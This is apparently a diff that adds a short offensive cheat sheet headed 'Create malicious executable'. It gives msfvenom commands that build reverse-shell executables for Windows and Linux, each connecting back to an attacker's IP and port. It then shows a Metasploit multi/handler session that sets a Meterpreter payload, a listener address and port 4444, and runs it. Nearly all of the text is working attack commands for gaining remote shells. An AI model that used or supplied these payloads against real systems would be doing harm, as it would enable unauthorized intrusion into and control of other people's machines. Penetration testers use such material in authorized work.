@@ -1,0 +1,22 @@
+Create malicious executable
+
+FOR WINDOWS
+x86 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
+x64 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
+
+FOR LINUX
+x86 msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
+x64 msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
+
+Start listener
+Change payload, ip and port
+
+$ ./msfconsole -q
+msf > use exploit/multi/handler
+msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf exploit(handler) > set lhost 192.168.1.123
+lhost => 192.168.1.123
+msf exploit(handler) > set lport 4444
+lport => 4444
+msf exploit(handler) > run
